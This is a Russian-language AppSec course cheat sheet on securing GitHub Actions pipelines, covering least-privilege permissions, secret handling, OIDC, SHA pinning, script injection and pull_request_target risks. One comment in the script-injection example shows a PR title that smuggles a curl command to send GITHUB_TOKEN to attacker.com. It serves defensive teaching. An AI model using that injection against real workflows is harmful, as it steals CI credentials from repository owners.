---
title: "CheatSheet: GitHub Actions Security | Курс AppSec"
description: "GitHub Actions security: secrets, OIDC, permissions, pinning actions, injection — защита CI/CD конвейера от компрометации."
keywords: "GitHub Actions, CI/CD security, secrets, OIDC, permissions, supply chain, AppSec, DevSecOps, пайплайн, Шмаков Илья, Elijah Shmakov, geminishkv, AppSecTA"
---


<div class="hero-section hero-section--compact">
  <div class="hero-content">
    <h1 class="hero-title">GitHub Actions Security</h1>
    <p class="hero-sub">Безопасность CI/CD пайплайнов</p>
  </div>
</div>

## Permissions — принцип минимальных привилегий

=== "Плохо"

    ```yaml
    # Все permissions по умолчанию — read+write на всё
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
    ```

=== "Хорошо"

    ```yaml
    # Глобально read-only, расширять per-job
    permissions:
      contents: read

    jobs:
      build:
        runs-on: ubuntu-latest
        permissions:
          contents: read
        steps:
          - uses: actions/checkout@v4

      deploy:
        runs-on: ubuntu-latest
        permissions:
          contents: read
          pages: write
          id-token: write  # для OIDC
        steps:
          - uses: actions/deploy-pages@v4
    ```

!!! warning "Почему important"

    Без `permissions:` workflow получает `write` на contents, packages, pull-requests. Компрометация одного step = запись в репозиторий.

***

## Secrets — управление секретами

<div class="lab-grid" style="grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));">

  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.4rem;">
    <div style="display:flex; align-items:baseline; gap:0.6rem; width:100%;">
      <span class="lab-card-num" style="font-size:0.9rem; width:auto;">secrets</span>
      <span style="font-size:0.65rem; color:#888; font-family:var(--font-code);">Repository / Organization</span>
    </div>
    <p style="font-size:0.75rem; margin:0.2rem 0 0; color:#555; line-height:1.5;">Хранятся зашифрованно. Маскируются в логах. Не доступны в fork PR.</p>
  </div>

  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.4rem;">
    <div style="display:flex; align-items:baseline; gap:0.6rem; width:100%;">
      <span class="lab-card-num" style="font-size:0.9rem; width:auto;">vars</span>
      <span style="font-size:0.65rem; color:#888; font-family:var(--font-code);">Variables (не секретные)</span>
    </div>
    <p style="font-size:0.75rem; margin:0.2rem 0 0; color:#555; line-height:1.5;">Для конфигурации: имена ресурсов, URLs, флаги. Видны в логах.</p>
  </div>

  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.4rem;">
    <div style="display:flex; align-items:baseline; gap:0.6rem; width:100%;">
      <span class="lab-card-num" style="font-size:0.9rem; width:auto;">OIDC</span>
      <span style="font-size:0.65rem; color:#888; font-family:var(--font-code);">OpenID Connect</span>
    </div>
    <span class="lab-tag" style="background:rgba(213,26,26,0.12); color:var(--brand-red); border-color:rgba(213,26,26,0.25);">RECOMMENDED</span>
    <p style="font-size:0.75rem; margin:0.2rem 0 0; color:#555; line-height:1.5;">Безсекретная аутентификация в AWS/GCP/Azure. Токен выпускается на время job.</p>
  </div>

</div>

### Утечка секретов

=== "Уязвимо"

    ```yaml
    - run: |
        echo "Debug: ${{ secrets.API_KEY }}"  # маскируется
        set -x                                # но set -x может утечь
        curl -H "Authorization: $TOKEN" https://api.example.com
    ```

=== "Безопасно"

    ```yaml
    - run: curl -H "Authorization: $TOKEN" https://api.example.com
      env:
        TOKEN: ${{ secrets.API_KEY }}
    # Без set -x, без echo, без перенаправления в файлы
    ```

!!! danger "Известные вектора утечки"

    - `set -x` в bash — выводит команды с подставленными значениями
    - Перенаправление в файл: `echo $SECRET > /tmp/debug.log` → артефакт
    - Сторонние actions: могут читать env и отправлять на свой сервер
    - `${{ }}` в `run:` — injection через PR title/body

***

## Pinning Actions — защита от supply chain

=== "Плохо"

    ```yaml
    - uses: actions/checkout@v4        # тег может быть переписан
    - uses: actions/setup-python@main  # ветка — максимальный риск
    ```

=== "Хорошо"

    ```yaml
    # Пинить по SHA коммита
    - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
    - uses: actions/setup-python@0a5c61591373683505ea898e09a3ea4f39ef2b9c  # v5.0.0
    ```

!!! info "Как найти SHA"

    ```bash
    gh api repos/actions/checkout/git/ref/tags/v4.1.1 --jq '.object.sha'
    ```

    Или используйте [StepSecurity Harden-Runner](https://github.com/step-security/harden-runner) для автоматического пиннинга.

***

## Script Injection

=== "Уязвимо"

    ```yaml
    # PR title контролируется атакующим!
    - run: echo "PR: ${{ github.event.pull_request.title }}"
    # Title: "fix"; curl attacker.com/steal?t=$GITHUB_TOKEN; echo "
    ```

=== "Безопасно"

    ```yaml
    # Передать через env — не интерполируется в shell
    - run: echo "PR: $TITLE"
      env:
        TITLE: ${{ github.event.pull_request.title }}
    ```

!!! danger "Опасные контексты"

    Никогда не используйте `${{ }}` напрямую в `run:` для:

    - `github.event.pull_request.title`
    - `github.event.pull_request.body`
    - `github.event.issue.title`
    - `github.event.comment.body`
    - `github.head_ref`

***

## Fork PR — ограничения

```yaml
# Не запускать workflow на PR из форков с write-доступом
on:
  pull_request_target:  # ОПАСНО — имеет write permissions
    types: [opened]

# Безопасная альтернатива
on:
  pull_request:         # read-only, без доступа к secrets
    types: [opened]
```

<div class="lab-grid" style="grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));">

  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.4rem;">
    <div style="display:flex; align-items:baseline; gap:0.6rem; width:100%;">
      <span class="lab-card-num" style="font-size:0.9rem; width:auto;">pull_request</span>
    </div>
    <span class="lab-tag lab-tag--gold">read-only</span>
    <p style="font-size:0.75rem; margin:0.2rem 0 0; color:#555; line-height:1.5;">Нет secrets для forks. Код из PR. Безопасно.</p>
  </div>

  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.4rem;">
    <div style="display:flex; align-items:baseline; gap:0.6rem; width:100%;">
      <span class="lab-card-num" style="font-size:0.9rem; width:auto;">pull_request_target</span>
    </div>
    <span class="lab-tag" style="background:rgba(213,26,26,0.12); color:var(--brand-red); border-color:rgba(213,26,26,0.25);">DANGER</span>
    <p style="font-size:0.75rem; margin:0.2rem 0 0; color:#555; line-height:1.5;">Secrets доступны. read+write. Код из base branch. Fork-PR получает доступ к секретам.</p>
  </div>

</div>

!!! danger "pull_request_target"

    Даёт fork-PR доступ к secrets. Используйте только если явно не checkout-ите PR код.

***

## Чеклист

- [ ] `permissions:` задан глобально и per-job
- [ ] Secrets через env, не через `${{ }}` в `run:`
- [ ] Actions запинены по SHA
- [ ] Нет `pull_request_target` с checkout PR кода
- [ ] Нет `set -x` и `echo $SECRET`
- [ ] OIDC вместо долгоживущих credentials для cloud
- [ ] Dependabot для обновления actions
- [ ] Branch protection: require review, status checks
- [ ] `CODEOWNERS` для `.github/workflows/`

